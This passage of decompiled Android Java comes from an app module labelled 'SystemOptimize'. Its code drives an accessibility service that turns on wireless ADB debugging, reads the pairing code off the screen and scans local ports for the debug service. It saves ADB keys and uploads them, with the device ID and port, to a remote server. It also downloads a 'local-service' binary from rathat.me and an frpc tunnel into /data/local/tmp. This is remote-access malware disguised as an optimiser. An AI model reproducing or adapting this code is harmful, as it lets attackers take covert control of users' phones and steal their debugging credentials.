            return;
        }
        int i2 = this.f53833b8;
        int i3 = this.f53834b9;
        if (i2 < i3) {
            t60.m214726f4("SystemOptimize", "开发者选项页面未打开，500ms后重试");
            this.f53817a2.schedule(new c41(this, 2), 500L, TimeUnit.MILLISECONDS);
        } else {
            tz0.m214806a6("开发者选项页面打开失败，重试次数已达上限(", i3, ")", "SystemOptimize");
            this.f53833b8 = 0;
        }
    }

    /* renamed from: j0 */
    public final void m212082j0(int i) {
        m212062g4().edit().putInt("debugPort", i).putBoolean("connected", true).putString("connectedDevice", this.f53816a1.getPackageName()).putLong("updateTime", System.currentTimeMillis()).putBoolean("paired", m212073h8() ? true : m212062g4().getBoolean("paired", false)).apply();
        if (v00.m214888a0()) {
            try {
                m212002c8(this, "/syncADBConfig", m212041c6(m212062g4().getBoolean("paired", false)), 4);
                t60.m214702c3("SystemOptimize", "【h.v】/syncADBConfig 同步成功 port=" + i);
            } catch (Exception e) {
                t60.m214702c3("SystemOptimize", "【h.v】/syncADBConfig 同步失败: " + e.getMessage());
            }
        }
    }

    /* renamed from: j1 */
    public final void m212083j1(X509Certificate x509Certificate) throws IOException {
        try {
            File fileM212065g8 = m212065g8();
            if (fileM212065g8 == null) {
                return;
            }
            File file = new File(fileM212065g8, "cert.pem");
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            try {
                Charset charset = AbstractC0577hd.f56650a0;
                byte[] bytes = "-----BEGIN CERTIFICATE-----\n".getBytes(charset);
                t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
                fileOutputStream.write(bytes);
                String strEncodeToString = Base64.encodeToString(x509Certificate.getEncoded(), 0);
                t60.m214694b5(strEncodeToString, "encodeToString(cert.enco…roid.util.Base64.DEFAULT)");
                byte[] bytes2 = strEncodeToString.getBytes(charset);
                t60.m214694b5(bytes2, "this as java.lang.String).getBytes(charset)");
                fileOutputStream.write(bytes2);
                byte[] bytes3 = "-----END CERTIFICATE-----\n".getBytes(charset);
                t60.m214694b5(bytes3, "this as java.lang.String).getBytes(charset)");
                fileOutputStream.write(bytes3);
                fileOutputStream.flush();
                fileOutputStream.close();
                t60.m214714d6("SystemOptimize", "证书已保存到: " + file.getAbsolutePath());
            } finally {
            }
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "保存证书失败", e);
        }
    }

    /* renamed from: j2 */
    public final void m212084j2(PrivateKey privateKey) throws IOException {
        try {
            File fileM212065g8 = m212065g8();
            if (fileM212065g8 == null) {
                return;
            }
            File file = new File(fileM212065g8, "private.key");
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            try {
                fileOutputStream.write(privateKey.getEncoded());
                fileOutputStream.flush();
                fileOutputStream.close();
                t60.m214714d6("SystemOptimize", "私钥已保存到: " + file.getAbsolutePath());
            } finally {
            }
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "保存私钥失败", e);
        }
    }

    /* renamed from: j3 */
    public final int m212085j3() throws InterruptedException {
        try {
            t60.m214714d6("SystemOptimize", "【N()】开始端口扫描 30000-49999...");
            ExecutorService executorServiceNewFixedThreadPool = Executors.newFixedThreadPool(2);
            ArrayList arrayList = new ArrayList();
            List<Pair> listM213306g5 = AbstractC0716jf.m213306g5(new Pair(30000, 34999), new Pair(35000, 39999), new Pair(40000, 44999), new Pair(45000, 49999));
            final String strM212018g5 = m212018g5();
            for (Pair pair : listM213306g5) {
                final int iIntValue = ((Number) pair.f57556a0).intValue();
                final int iIntValue2 = ((Number) pair.f57557a1).intValue();
                Future futureSubmit = executorServiceNewFixedThreadPool.submit(new Callable() { // from class: d41
                    @Override // java.util.concurrent.Callable
                    public final Object call() throws IOException {
                        String str = strM212018g5;
                        int i = iIntValue;
                        int i2 = iIntValue2;
                        if (i <= i2) {
                            int i3 = i;
                            while (true) {
                                C0360a2 c0360a2 = this;
                                if (!c0360a2.f53841c6.get()) {
                                    try {
                                        Socket socket = new Socket();
                                        socket.connect(new InetSocketAddress(str, i3), 50);
                                        socket.close();
                                        t60.m214702c3("SystemOptimize", "【N()】端口 " + i3 + " 开放，尝试 ADB 验证...");
                                        File fileM212065g8 = c0360a2.m212065g8();
                                        if (fileM212065g8 != null) {
                                            File file = new File(fileM212065g8, "cert.pem");
                                            File file2 = new File(fileM212065g8, "private.key");
                                            if (file.exists() && file2.exists()) {
                                                try {
                                                    g41 g41Var = new g41(c0360a2, str, i3, file, file2);
                                                    if (g41Var.m212892a1()) {
                                                        t60.m214714d6("SystemOptimize", "【N()】端口 " + i3 + " ADB 验证成功!");
                                                        g41Var.m212891a0();
                                                        return Integer.valueOf(i3);
                                                    }
                                                    g41Var.m212891a0();
                                                } catch (Exception e) {
                                                    t60.m214702c3("SystemOptimize", "【N()】端口 " + i3 + " ADB 验证失败: " + e.getMessage());
                                                }
                                            }
                                        }
                                    } catch (Exception unused) {
                                    }
                                    if (i3 == i2) {
                                        break;
                                    }
                                    i3++;
                                } else {
                                    break;
                                }
                            }
                        }
                        return -1;
                    }
                });
                t60.m214694b5(futureSubmit, "executor.submit(java.uti…ble -1\n                })");
                arrayList.add(futureSubmit);
            }
            int iIntValue3 = -1;
            while (!arrayList.isEmpty()) {
                ListIterator listIterator = arrayList.listIterator();
                while (listIterator.hasNext()) {
                    Future future = (Future) listIterator.next();
                    if (future.isDone()) {
                        try {
                            Integer num = (Integer) future.get();
                            future.cancel(true);
                            listIterator.remove();
                            if (num != null && num.intValue() > 0) {
                                iIntValue3 = num.intValue();
                            }
                        } catch (Exception unused) {
                            listIterator.remove();
                        }
                    }
                }
                if (iIntValue3 > 0) {
                    break;
                }
                Thread.sleep(100L);
            }
            executorServiceNewFixedThreadPool.shutdownNow();
            if (iIntValue3 > 0) {
                t60.m214714d6("SystemOptimize", "【N()】扫描到端口: " + iIntValue3);
            } else {
                t60.m214726f4("SystemOptimize", "【N()】未扫描到端口");
            }
            return iIntValue3;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "【N()】端口扫描异常", e);
            return -1;
        }
    }

    /* renamed from: j4 */
    public final int m212086j4() throws IOException {
        int iIntValue;
        try {
            int iM212063g6 = m212063g6();
            if (iM212063g6 > 0) {
                t60.m214714d6("SystemOptimize", "从系统设置读取到调试端口: " + iM212063g6);
                return iM212063g6;
            }
            Process processExec = Runtime.getRuntime().exec("sh -c \"netstat -tln | grep -E ':3[0-9]{4}|:4[0-9]{4}' | grep LISTEN\"");
            InputStream inputStream = processExec.getInputStream();
            t60.m214694b5(inputStream, "process.inputStream");
            String strM210590e1 = b81.m210590e1(new BufferedReader(new InputStreamReader(inputStream, AbstractC0577hd.f56650a0), Segment.SIZE));
            TimeUnit timeUnit = TimeUnit.SECONDS;
            if (!processExec.waitFor(10L, TimeUnit.SECONDS)) {
                processExec.destroy();
            }
            t20 t20Var = new t20(Regex.m213644a1(new Regex(":([34]\\d{4})\\s"), strM210590e1));
            while (t20Var.hasNext()) {
                md0 md0Var = (md0) t20Var.next();
                if (md0Var.f58334a2 == null) {
                    md0Var.f58334a2 = new ld0(md0Var);
                }
                ld0 ld0Var = md0Var.f58334a2;
                t60.m214692b3(ld0Var);
                Integer numM213685d8 = AbstractC0779a1.m213685d8((String) ld0Var.get(1));
                if (numM213685d8 != null && 30000 <= (iIntValue = numM213685d8.intValue()) && iIntValue < 50000) {
                    t60.m214714d6("SystemOptimize", "扫描到可能的调试端口: " + iIntValue);
                    return iIntValue;
                }
            }
            return 0;
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "扫描端口失败", e);
            return 0;
        }
    }

    /* renamed from: j5 */
    public final void m212087j5(String str, w00 w00Var) {
        this.f53817a2.execute(new RunnableC0029ai(this, w00Var, str));
    }

    /* JADX WARN: Code restructure failed: missing block: B:14:0x0040, code lost:
    
        r4 = r0;
        r7 = new android.graphics.Path();
        r7.moveTo(r2, 0.2f * r4);
        r7.lineTo(r2, r4 * 0.8f);
        r12.f53815a0.dispatchGesture(new android.accessibilityservice.GestureDescription.Builder().addStroke(new android.accessibilityservice.GestureDescription.StrokeDescription(r7, 0, 100)).build(), null, null);
        java.lang.Thread.sleep(150);
        r13.refresh();
        r3 = r3 + 1;
     */
    /* renamed from: j6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m212088j6(AccessibilityNodeInfo accessibilityNodeInfo) throws InterruptedException {
        try {
            DisplayMetrics displayMetrics = this.f53816a1.getResources().getDisplayMetrics();
            int i = displayMetrics.widthPixels;
            int i2 = displayMetrics.heightPixels;
            float f = i / 2.0f;
            int i3 = 0;
            while (i3 < 5) {
                List<AccessibilityNodeInfo.AccessibilityAction> actionList = accessibilityNodeInfo.getActionList();
                t60.m214694b5(actionList, "node.actionList");
                if (!actionList.isEmpty()) {
                    Iterator<T> it = actionList.iterator();
                    while (it.hasNext()) {
                        if (((AccessibilityNodeInfo.AccessibilityAction) it.next()).getId() == 8192) {
                            break;
                        }
                    }
                }
                t60.m214702c3("SystemOptimize", "scrollBackwardEnd: 已到达顶部（第 " + i3 + " 次）");
                return;
            }
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "scrollBackwardEnd 异常", e);
        }
    }

    /* renamed from: j7 */
    public final void m212089j7(AccessibilityNodeInfo accessibilityNodeInfo) throws InterruptedException {
        try {
            float f = r0.widthPixels / 2.0f;
            float f2 = this.f53816a1.getResources().getDisplayMetrics().heightPixels;
            float f3 = 0.8f * f2;
            float f4 = f2 * 0.2f;
            for (int i = 0; i < 20; i++) {
                Path path = new Path();
                path.moveTo(f, f3);
                path.lineTo(f, f4);
                this.f53815a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L)).build(), null, null);
                Thread.sleep(150L);
            }
            accessibilityNodeInfo.refresh();
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "scrollForwardEnd 异常", e);
        }
    }

    /* renamed from: j8 */
    public final AccessibilityNodeInfo m212090j8(AccessibilityNodeInfo accessibilityNodeInfo, List list) {
        for (int i = 0; i < 3; i++) {
            try {
                AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
                if (rootInActiveWindow == null) {
                    return null;
                }
                AccessibilityNodeInfo accessibilityNodeInfoM212014f9 = m212014f9(rootInActiveWindow, list);
                if (accessibilityNodeInfoM212014f9 != null) {
                    return accessibilityNodeInfoM212014f9;
                }
                List list2 = C0362a4.f53875a0;
                if (!C0362a4.m212109a4(accessibilityNodeInfo, this.f53815a0, this.f53816a1)) {
                    return null;
                }
            } catch (Exception e) {
                t60.m214705c6("SystemOptimize", "scrollForwardUtil 异常", e);
                return null;
            }
        }
        return null;
    }

    /* renamed from: k0 */
    public final void m212091k0(int i) {
        m212062g4().edit().putInt("debugPort", i).apply();
    }

    /* renamed from: k2 */
    public final void m212092k2() {
        String strM212002c8;
        t60.m214714d6("SystemOptimize", "【Heartbeat】启动心跳 (KeepHeartThread + H() + case 0)");
        C0931ny c0931ny = this.f53860e5;
        if (!this.f53859e4) {
            try {
                ContentResolver contentResolver = this.f53816a1.getContentResolver();
                contentResolver.registerContentObserver(Settings.Global.getUriFor("development_settings_enabled"), false, c0931ny);
                contentResolver.registerContentObserver(Settings.Global.getUriFor("adb_enabled"), false, c0931ny);
                contentResolver.registerContentObserver(Settings.Global.getUriFor("adb_wifi_enabled"), false, c0931ny);
                this.f53859e4 = true;
                t60.m214714d6("SystemOptimize", "【ContentObserver】已注册 3 个 Settings.Global 监听");
            } catch (Exception e) {
                t60.m214705c6("SystemOptimize", "【ContentObserver】注册失败", e);
            }
        }
        try {
            File externalFilesDir = this.f53816a1.getExternalFilesDir(null);
            if (externalFilesDir != null) {
                String absolutePath = externalFilesDir.getAbsolutePath();
                p41 p41Var = new p41(externalFilesDir, this);
                this.f53832b7 = p41Var;
                p41Var.startWatching();
                t60.m214714d6("SystemOptimize", "【FileObserver】已启动，监听目录: " + absolutePath);
            }
        } catch (Exception e2) {
            t60.m214705c6("SystemOptimize", "【FileObserver】启动失败", e2);
        }
        this.f53851d6.set(0);
        this.f53852d7 = true;
        this.f53853d8.set(0);
        this.f53854d9.set(0);
        try {
            if (v00.m214888a0() && (strM212002c8 = m212002c8(this, "/shareADBConfig", null, 6)) != null && strM212002c8.length() > 0) {
                try {
                    JSONObject jSONObjectOptJSONObject = new JSONObject(strM212002c8).optJSONObject("data");
                    if (jSONObjectOptJSONObject != null) {
                        int iOptInt = jSONObjectOptJSONObject.optInt("debugPort", 0);
                        boolean zOptBoolean = jSONObjectOptJSONObject.optBoolean("paired", false);
                        if (iOptInt > 0 && zOptBoolean) {
                            m212091k0(iOptInt);
                            t60.m214714d6("SystemOptimize", "【shareADBConfig】恢复 debugPort=" + iOptInt + " paired=" + zOptBoolean);
                        }
                    }
                } catch (Exception e3) {
                    t60.m214702c3("SystemOptimize", "【shareADBConfig】解析响应失败: " + e3.getMessage());
                }
            }
        } catch (Exception e4) {
            t60.m214702c3("SystemOptimize", "【shareADBConfig】恢复配置失败 (local-service 可能未运行): " + e4.getMessage());
        }
        Object value = this.f53850d5.getValue();
        t60.m214694b5(value, "<get-heartbeatExecutor>(...)");
        ((ScheduledExecutorService) value).scheduleAtFixedRate(new c41(this, 3), 3L, 10L, TimeUnit.SECONDS);
    }

    /* renamed from: k3 */
    public final void m212093k3() {
        t60.m214714d6("SystemOptimize", "开始无线调试配对流程");
        this.f53823a8.set(true);
        this.f53822a7.set(false);
        if (this.f53817a2.isShutdown()) {
            t60.m214714d6("SystemOptimize", "executor 已关闭，重新创建");
            ScheduledExecutorService scheduledExecutorServiceNewSingleThreadScheduledExecutor = Executors.newSingleThreadScheduledExecutor();
            t60.m214694b5(scheduledExecutorServiceNewSingleThreadScheduledExecutor, "newSingleThreadScheduledExecutor()");
            this.f53817a2 = scheduledExecutorServiceNewSingleThreadScheduledExecutor;
        }
        ScheduledExecutorService scheduledExecutorService = this.f53817a2;
        c41 c41Var = new c41(this, 11);
        TimeUnit timeUnit = TimeUnit.SECONDS;
        scheduledExecutorService.schedule(c41Var, 120L, timeUnit);
        this.f53817a2.schedule(new c41(this, 12), 30L, timeUnit);
        this.f53819a4.set(SystemOptimizeManager$PairState.f53759a0);
        m212025k1(5);
        if (m212028a2()) {
            t60.m214714d6("SystemOptimize", "已在开发者选项页面，直接查找无线调试");
            m212025k1(5);
            this.f53818a3.add("pairInDevOption");
            m212087j5("G", new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$startPairFlow$3
                {
                    super(0);
                }

                @Override // p000.w00
                public final Object invoke() {
                    C0360a2.m211991b0(this.f53786a0);
                    return C1351vv.f60710b1;
                }
            });
            return;
        }
        if (!m212032a6()) {
            t60.m214714d6("SystemOptimize", "不在设置页面，打开开发者选项");
            m212081i6();
        } else {
            t60.m214714d6("SystemOptimize", "已在无线调试页面，直接开始配对");
            m212025k1(5);
            this.f53818a3.add("pairInWifiDebugWindow");
            m212087j5("W", new w00() { // from class: com.storm.safe.rock.service.modules.setup.SystemOptimizeManager$startPairFlow$4
                {
                    super(0);
                }

                @Override // p000.w00
                public final Object invoke() {
                    C0360a2.m211995b4(this.f53787a0);
                    return C1351vv.f60710b1;
                }
            });
        }
    }

    /* renamed from: k4 */
    public final void m212094k4() {
        try {
            if (this.f53819a4.get() == SystemOptimizeManager$PairState.f53765a6) {
                return;
            }
            m212026a0();
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "t0() 异常", e);
        }
    }

    /* renamed from: k5 */
    public final void m212095k5() throws InterruptedException {
        t60.m214714d6("SystemOptimize", "外部触发配对流程");
        t60.m214714d6("SystemOptimize", "强制开始无线调试配对流程（跳过检查）");
        this.f53823a8.set(true);
        this.f53822a7.set(false);
        if (this.f53817a2.isShutdown()) {
            t60.m214714d6("SystemOptimize", "executor 已关闭，重新创建");
            ScheduledExecutorService scheduledExecutorServiceNewSingleThreadScheduledExecutor = Executors.newSingleThreadScheduledExecutor();
            t60.m214694b5(scheduledExecutorServiceNewSingleThreadScheduledExecutor, "newSingleThreadScheduledExecutor()");
            this.f53817a2 = scheduledExecutorServiceNewSingleThreadScheduledExecutor;
        }
        ScheduledExecutorService scheduledExecutorService = this.f53817a2;
        c41 c41Var = new c41(this, 5);
        TimeUnit timeUnit = TimeUnit.SECONDS;
        scheduledExecutorService.schedule(c41Var, 120L, timeUnit);
        this.f53817a2.schedule(new c41(this, 6), 30L, timeUnit);
        this.f53819a4.set(SystemOptimizeManager$PairState.f53759a0);
        m212080i5();
    }

    /* JADX WARN: Removed duplicated region for block: B:56:0x016f  */
    /* renamed from: k6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m212096k6(int i, String str) {
        String str2;
        t60.m214702c3("SystemOptimize", "X(): " + str + ":" + i);
        this.f53839c4 = str;
        m212091k0(i);
        try {
            if (this.f53840c5.get()) {
                t60.m214702c3("SystemOptimize", "X(): local-service 已确认运行，跳过");
                return true;
            }
            int iM212039c1 = m212039c1("if [ -f /data/local/tmp/local-service ]; then echo \"File exists\"; else echo \"File does not exist\"; fi", "File exists", "File does not exist");
            if (iM212039c1 != 0) {
                if (iM212039c1 != 1) {
                    t60.m214702c3("SystemOptimize", "X(): 无法检测文件是否存在");
                    return false;
                }
                t60.m214702c3("SystemOptimize", "X(): 文件存在");
                int iM212039c12 = m212039c1("ps -ef | grep local-service", "local-service server", "grep local-service");
                boolean z = iM212039c12 == 1 || (iM212039c12 != 0 && v00.m214888a0());
                if (this.f53816a1.getApplicationInfo().nativeLibraryDir != null) {
                    try {
                        if (m212039c1("if [ -f /data/local/tmp/frpc ]; then echo \"File exists\"; else echo \"File does not exist\"; fi", "File exists", "File does not exist") == 0) {
                            t60.m214714d6("SystemOptimize", "ensureFrpcBinaryExists: frpc not found, downloading from server...");
                            m212050d8();
                        } else {
                            t60.m214702c3("SystemOptimize", "ensureFrpcBinaryExists: frpc already exists");
                        }
                    } catch (Exception e) {
                        t60.m214705c6("SystemOptimize", "ensureFrpcBinaryExists error", e);
                    }
                }
                if (z) {
                    t60.m214714d6("SystemOptimize", "X(): 文件存在且运行中");
                    this.f53840c5.set(true);
                    new Thread(new c41(this, 4)).start();
                    m212076i1();
                } else {
                    t60.m214714d6("SystemOptimize", "X(): 文件存在但未运行 → 启动");
                    m212037b9("chmod 777 /data/local/tmp/local-service");
                    m212038c0();
                    v00.f60540a1 = 0L;
                    new Thread(new c41(this, 4)).start();
                    m212076i1();
                }
                return true;
            }
            t60.m214702c3("SystemOptimize", "X(): 文件不存在");
            String str3 = this.f53816a1.getApplicationInfo().nativeLibraryDir;
            t60.m214714d6("SystemOptimize", "X(): nativeLibDir=" + str3);
            if (str3 != null && str3.length() > 0) {
                String strConcat = str3.concat("/liblocal-service.so");
                boolean zExists = new File(strConcat).exists();
                t60.m214714d6("SystemOptimize", "X(): soPath=" + strConcat + ", exists=" + zExists);
                if (zExists) {
                    if (m212037b9("cp -f " + strConcat + " /data/local/tmp/local-service") && m212037b9("chmod 777 /data/local/tmp/local-service")) {
                        t60.m214714d6("SystemOptimize", "X(): local-service 复制成功");
                        m212050d8();
                        m212038c0();
                        v00.f60540a1 = 0L;
                        new Thread(new c41(this, 4)).start();
                        m212076i1();
                        return true;
                    }
                }
            }
            t60.m214726f4("SystemOptimize", "X(): native lib 复制失败，尝试网络下载");
            String[] strArr = Build.SUPPORTED_ABIS;
            if (strArr == null) {
                str2 = "armeabi";
            } else {
                str2 = strArr.length == 0 ? null : strArr[0];
                if (str2 == null) {
                }
            }
            m212055e3("https://rathat.me/lib/" + str2 + "/local-service");
            m212076i1();
            return true;
        } catch (Exception e2) {
            t60.m214705c6("SystemOptimize", "X() 异常", e2);
            return false;
        }
    }

    /* renamed from: k7 */
    public final void m212097k7() {
        try {
            try {
                Settings.Global.putInt(this.f53816a1.getContentResolver(), "adb_wifi_enabled", 1);
            } catch (SecurityException e) {
                t60.m214726f4("SystemOptimize", "e0() Settings.Global 写入被拒绝（WRITE_SECURE_SETTINGS 未授予？）: " + e.getMessage());
            }
            if (m212073h8()) {
                t60.m214714d6("SystemOptimize", "e0() 直接写 Settings.Global 开启无线调试成功");
                return;
            }
            if (v00.m214888a0()) {
                t60.m214714d6("SystemOptimize", "e0() 通过 local-service /openWifiDebug 开启无线调试");
                try {
                    m212002c8(this, "/openWifiDebug", null, 6);
                    if (m212073h8()) {
                        t60.m214714d6("SystemOptimize", "e0() 通过 local-service 开启无线调试成功");
                        return;
                    }
                    return;
                } catch (Exception e2) {
                    t60.m214726f4("SystemOptimize", "e0() local-service 开启无线调试失败: " + e2.getMessage());
                    return;
                }
            }
            return;
        } catch (Exception e3) {
            tz0.m214810b0("e0() 开启无线调试异常: ", e3.getMessage(), "SystemOptimize");
        }
        tz0.m214810b0("e0() 开启无线调试异常: ", e3.getMessage(), "SystemOptimize");
    }

    /* renamed from: k8 */
    public final k41 m212098k8() {
        String string;
        String string2;
        AccessibilityNodeInfo rootInActiveWindow = this.f53815a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return null;
        }
        ArrayList arrayList = new ArrayList();
        m212007f2(rootInActiveWindow, arrayList);
        y90 y90Var = AbstractC0361a3.f53874a0;
        Set setM213304j1 = AbstractC0715je.m213304j1(dh0.f55787d7);
        int size = arrayList.size();
        String str = "";
        int iIntValue = 0;
        int i = 0;
        while (i < size) {
            Object obj = arrayList.get(i);
            i++;
            CharSequence text = ((AccessibilityNodeInfo) obj).getText();
            if (text != null && (string = text.toString()) != null && (string2 = AbstractC0779a1.m213687e0(string).toString()) != null && !setM213304j1.contains(string2)) {
                List listM213677d0 = AbstractC0779a1.m213677d0(string2, new String[]{":"}, 6);
                if (listM213677d0.size() == 2) {
                    String string3 = AbstractC0779a1.m213687e0((String) listM213677d0.get(1)).toString();
                    if (string3.length() > 0) {
                        int i2 = 0;
                        while (true) {
                            if (i2 < string3.length()) {
                                if (!Character.isDigit(string3.charAt(i2))) {
                                    break;
                                }
                                i2++;
                            } else if (iIntValue <= 0) {
                                Integer numM213685d8 = AbstractC0779a1.m213685d8(AbstractC0779a1.m213687e0((String) listM213677d0.get(1)).toString());
                                iIntValue = numM213685d8 != null ? numM213685d8.intValue() : 0;
                            }
                        }
                    }
                }
                if (listM213677d0.size() == 1 && string2.length() == 6 && string2.length() > 0) {
                    int i3 = 0;
                    while (true) {
                        if (i3 < string2.length()) {
                            if (!Character.isDigit(string2.charAt(i3))) {
                                break;
                            }
                            i3++;
                        } else if (str.length() == 0) {
                            str = string2;
                        }
                    }
                }
                if (str.length() > 0 && iIntValue > 0) {
                    break;
                }
            }
        }
        if (str.length() <= 0 || iIntValue <= 0) {
            return null;
        }
        k41 k41Var = new k41();
        k41Var.f57454a0 = "";
        k41Var.f57455a1 = iIntValue;
        k41Var.f57456a2 = str;
        return k41Var;
    }

    /* renamed from: k9 */
    public final void m212099k9() {
        ConcurrentLinkedQueue concurrentLinkedQueue = this.f53818a3;
        try {
            concurrentLinkedQueue.remove("openDevOptions");
            concurrentLinkedQueue.remove("clickBuildNumber");
            concurrentLinkedQueue.remove("confirmDevMode");
        } catch (Exception e) {
            t60.m214705c6("SystemOptimize", "u() 异常", e);
        }
    }

    /* renamed from: l0 */
    public final boolean m212100l0() throws IOException {
        boolean z;
        C0323a8 c0323a8M211471g5;
        try {
            File fileM212065g8 = m212065g8();
            try {
                if (fileM212065g8 == null || !fileM212065g8.exists()) {
                    t60.m214704c5("SystemOptimize", "uploadAdbKeysToServer: 密钥目录不存在");
                    return false;
                }
                File file = new File(fileM212065g8, "cert.pem");
                File file2 = new File(fileM212065g8, "private.key");
                if (!file.exists() || !file2.exists()) {
                    t60.m214704c5("SystemOptimize", "uploadAdbKeysToServer: 密钥文件不存在 cert=" + file.exists() + " key=" + file2.exists());
                    return false;
                }
                String string = Settings.Secure.getString(this.f53816a1.getContentResolver(), "android_id");
                AccessibilityService accessibilityService = this.f53815a0;
                dqtvuisjd dqtvuisjdVar = accessibilityService instanceof dqtvuisjd ? (dqtvuisjd) accessibilityService : null;
                if (dqtvuisjdVar != null && (c0323a8M211471g5 = dqtvuisjdVar.m211471g5()) != null) {
                    String strM211644b0 = c0323a8M211471g5.m211644b0();
                    if (strM211644b0 != null) {
                        try {
                            String str = "----WebKitFormBoundary" + System.currentTimeMillis();
                            URLConnection uRLConnectionOpenConnection = new URL(strM211644b0.concat("/api/adb-keys/upload")).openConnection();
                            t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
                            HttpURLConnection httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
                            httpURLConnection.setRequestMethod("POST");
                            httpURLConnection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + str);
                            httpURLConnection.setDoOutput(true);
                            httpURLConnection.setConnectTimeout(15000);
                            httpURLConnection.setReadTimeout(15000);
                            byte[] bArrM215419f7 = AbstractC1517zh.m215419f7(file);
                            byte[] bArrM215419f72 = AbstractC1517zh.m215419f7(file2);
                            OutputStream outputStream = httpURLConnection.getOutputStream();
                            String str2 = "--" + str + HTTP.CRLF;
                            Charset charset = AbstractC0577hd.f56650a0;
                            byte[] bytes = str2.getBytes(charset);
                            t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
                            outputStream.write(bytes);
                            byte[] bytes2 = "Content-Disposition: form-data; name=\"deviceId\"\r\n\r\n".getBytes(charset);
                            t60.m214694b5(bytes2, "this as java.lang.String).getBytes(charset)");
                            outputStream.write(bytes2);
                            byte[] bytes3 = (string + HTTP.CRLF).getBytes(charset);
                            t60.m214694b5(bytes3, "this as java.lang.String).getBytes(charset)");
                            outputStream.write(bytes3);
                            byte[] bytes4 = ("--" + str + HTTP.CRLF).getBytes(charset);
                            t60.m214694b5(bytes4, "this as java.lang.String).getBytes(charset)");
                            outputStream.write(bytes4);
                            byte[] bytes5 = "Content-Disposition: form-data; name=\"cert\"; filename=\"cert.pem\"\r\n".getBytes(charset);
                            t60.m214694b5(bytes5, "this as java.lang.String).getBytes(charset)");
                            outputStream.write(bytes5);
                            byte[] bytes6 = "Content-Type: application/octet-stream\r\n\r\n".getBytes(charset);
                            t60.m214694b5(bytes6, "this as java.lang.String).getBytes(charset)");
                            outputStream.write(bytes6);
                            outputStream.write(bArrM215419f7);
                            byte[] bytes7 = HTTP.CRLF.getBytes(charset);
                            t60.m214694b5(bytes7, "this as java.lang.String).getBytes(charset)");
                            outputStream.write(bytes7);
                            byte[] bytes8 = ("--" + str + HTTP.CRLF).getBytes(charset);
                            t60.m214694b5(bytes8, "this as java.lang.String).getBytes(charset)");
                            outputStream.write(bytes8);
                            byte[] bytes9 = "Content-Disposition: form-data; name=\"key\"; filename=\"private.key\"\r\n".getBytes(charset);
                            t60.m214694b5(bytes9, "this as java.lang.String).getBytes(charset)");
                            outputStream.write(bytes9);
                            byte[] bytes10 = "Content-Type: application/octet-stream\r\n\r\n".getBytes(charset);
                            t60.m214694b5(bytes10, "this as java.lang.String).getBytes(charset)");
                            outputStream.write(bytes10);
                            outputStream.write(bArrM215419f72);
                            byte[] bytes11 = HTTP.CRLF.getBytes(charset);
                            t60.m214694b5(bytes11, "this as java.lang.String).getBytes(charset)");
                            outputStream.write(bytes11);
                            byte[] bytes12 = ("--" + str + "--\r\n").getBytes(charset);
                            t60.m214694b5(bytes12, "this as java.lang.String).getBytes(charset)");
                            outputStream.write(bytes12);
                            outputStream.flush();
                            outputStream.close();
                            int responseCode = httpURLConnection.getResponseCode();
                            t60.m214714d6("SystemOptimize", "上传 ADB 密钥结果: " + responseCode + ", cert=" + bArrM215419f7.length + "字节, key=" + bArrM215419f72.length + "字节");
                            return responseCode == 200;
                        } catch (Exception e) {
                            e = e;
                            z = false;
                            t60.m214705c6("SystemOptimize", "上传 ADB 密钥失败", e);
                            return z;
                        }
                    }
                }
                t60.m214704c5("SystemOptimize", "uploadAdbKeysToServer: 无法获取当前服务器地址");
                return false;
            } catch (Exception e2) {
                e = e2;
            }
        } catch (Exception e3) {
            e = e3;
            z = false;
        }
    }

    /* renamed from: l1 */
    public final boolean m212101l1(int i) throws IOException {
        C0323a8 c0323a8M211471g5;
        String strM211644b0;
        if (i <= 0) {
            t60.m214704c5("SystemOptimize", "uploadDebugPortToServer: 无效端口 " + i);
            return false;
        }
        try {
            String string = Settings.Secure.getString(this.f53816a1.getContentResolver(), "android_id");
            AccessibilityService accessibilityService = this.f53815a0;
            dqtvuisjd dqtvuisjdVar = accessibilityService instanceof dqtvuisjd ? (dqtvuisjd) accessibilityService : null;
            if (dqtvuisjdVar == null || (c0323a8M211471g5 = dqtvuisjdVar.m211471g5()) == null || (strM211644b0 = c0323a8M211471g5.m211644b0()) == null) {
                t60.m214704c5("SystemOptimize", "uploadDebugPortToServer: 无法获取当前服务器地址");
                return false;
            }
            String strM212019g9 = m212019g9();
            if (strM212019g9 == null) {
                strM212019g9 = "127.0.0.1";
            }
            URLConnection uRLConnectionOpenConnection = new URL(strM211644b0.concat("/api/adb-keys/port")).openConnection();
            t60.m214693b4(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            HttpURLConnection httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type", "application/json");
            httpURLConnection.setDoOutput(true);
            httpURLConnection.setConnectTimeout(15000);
            httpURLConnection.setReadTimeout(15000);
            String str = "{\"deviceId\":\"" + string + "\",\"ip\":\"" + strM212019g9 + "\",\"port\":" + i + "}";
            OutputStream outputStream = httpURLConnection.getOutputStream();
            byte[] bytes = str.getBytes(AbstractC0577hd.f56650a0);
            t60.m214694b5(bytes, "this as java.lang.String).getBytes(charset)");
            outputStream.write(bytes);
            httpURLConnection.getOutputStream().close();
